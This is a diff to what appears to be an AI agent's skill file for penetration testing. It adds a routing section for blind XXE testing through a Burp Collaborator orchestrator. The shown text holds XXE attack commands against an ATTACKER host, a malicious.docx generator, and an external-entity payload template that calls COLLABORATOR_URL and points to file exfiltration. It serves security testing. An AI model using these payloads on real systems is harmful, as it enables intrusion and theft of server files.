@@ -581,3 +581,20 @@ ruby XXEinjector.rb --host=ATTACKER --httpport=8080 --file=request.txt --path=/e
 xxeserv -o files.log -p 2121 -w -wd public -wp 8000
 python oxml_xxe.py -m payload.xml -o malicious.docx
 ```
+
+## Collaborator Exit (Burp co-pilot path)
+
+If `engagement/state.md` contains `burp-copilot: active` AND you reach a blind
+XXE testing point that requires OOB callbacks, return to the orchestrator with:
+
+**Routing Recommendations:**
+- OOB needed: blind XXE at [endpoint]/[parameter]
+- Payload template: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR_URL/xxe">]>` (or DTD variant)
+- Interaction type: dns|http
+- Context: [what a callback confirms — e.g., "XML parser resolves external entities", "file exfiltration via OOB DTD possible"]
+
+The orchestrator handles Collaborator payload generation and interaction
+polling in the main context, then re-invokes this skill with results.
+
+If `burp-copilot` is NOT active, use existing fallbacks (interactsh, xxeserv,
+error-based via local DTD, parameter entity tricks).
